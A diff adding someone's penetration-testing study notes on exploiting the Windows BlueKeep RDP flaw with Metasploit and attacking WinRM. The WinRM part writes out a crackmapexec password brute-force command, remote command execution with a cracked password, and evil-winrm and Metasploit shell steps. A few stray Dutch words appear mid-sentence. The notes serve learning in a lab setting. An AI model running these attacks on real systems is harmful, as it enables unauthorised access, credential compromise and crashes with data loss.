@@ -206,29 +206,27 @@ flag: port-number-3333![[Pasted image 20230705140914.png]]
 
 ### Exploiting Windows CVE-2019-0708 RDP Vulnerability (BlueKeep) 
 
+- BlueKeep is given to an RDP vulnerability  in Windows that could potentially allow attackers to remotely  execute arbitrary code and gain access to windows system and network of target system 
+- BlueKeep was made public in Microsoft in 2019 
+- The Bluekeep exploit takes advantage of a vulnerability in the Windows RDP protocol that allow attackers to gain access to chunk of kernel memory consequently allowing them to remotely execute arbitrary code at the system level without authentication 
+- Everything executed at kernel level means elevated privileges 
+- Bluekeep vulnerability has various illegal PoC and exploit code that could be malicious in nature gebruik daarom alleen verified exploit code and modules for exploitation 
+- The BlueKeep exploit has a MSF auxiliary module that could be used to check if a target system is vulnerable to the exploit and also has an exploit module that van be used to exploit the vulnerability on unpatched systems 
+- BlueKeep exploit module can be used to exploit vulnerable windows systems and consequently provide us with privileged meterpreter sessions on the target system 
+- Targeting Kernel space memory and applications can cause system crashes 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+demo 
+- run nmap to check for rdp: sudo nmap -p 3389 targetip 
+- mfsconsole to check if target if vulnerable
+	- search BlueKeep 
+	- use the aux module and set options 
+	- use 1 (it selects the module at index 1 in the current module category.)
+	- set options of exploit module 
+	- you need to manually configure the version of windows that you are targeting: show targets 
+	- set target (number of target you need) 
+	- exploit 
+	- ![[Pasted image 20230705150616.png]] the size needs to be modified if it is to high because it will crash the target system 
+	    --> be carefull with kernel exploit because they can crash a system and cause data loss 
 
 
 
@@ -239,3 +237,35 @@ flag: port-number-3333![[Pasted image 20230705140914.png]]
 
 
 ### Exploiting WinRM 
+
+About WinRM
+- Windows Remote Management protocol can be uesd to facilitate remote access with Windows system over HTTP
+- Makes life easier for system admins 
+- WINRM is typically used in the following ways:
+	- Remotely access and interact with Windows hosts on local network 
+	- Remotely access and execute commands on windows systems 
+	- Manage and configure Windows systems remotely 
+	- WinRM typically uses TCP port 5985 and 5986 (HTTP)
+- How is authentication facilitated? 
+	- WinRM implements access control and security for communication between systems through various forms of authentication 
+	-  We can use utility called "crackmapexec" to perform a brute-force on winrm in order to identify users and their passwords as well as execute commands on the target system 
+	- we can also utilize a ruby script called "evil-winrm" to obtain a command shell session on the target system 
+	
+Demo 
+
+- Perform nmap scan to check if winrm is enabled and running 
+- when you cannot identify port 5985 (or 5986): run nmap on exact port 
+- new terminal: launch crackmapexec 
+	- start the bruteforce: **crackmapexec winrm  targetip -u adminstrator -p /usr/share/metasploit-framework/wordlists/unix_password.txt** 
+	- execute arbitrary windows command on target: 
+		- crackmapexec winrm targetip -u adminstrator -p tinkerbell -x "whoami"
+		- crackmapexec winrm targetip -u adminstrator -p tinkerbell -x "systeminfo"
+Can we obtain a command shell session? Yes! 
+1) one way is with evil-winrm.rb:
+	- **evil-winrm.rb -u adminstrator -p 'tinkerbell' targetip**
+2) Metasploit 
+	- service postgresql && msfconsole 
+	- search winrm_script and use winrm_script_exec 
+	- set FORCE_VBS true, set password and username 
+
+
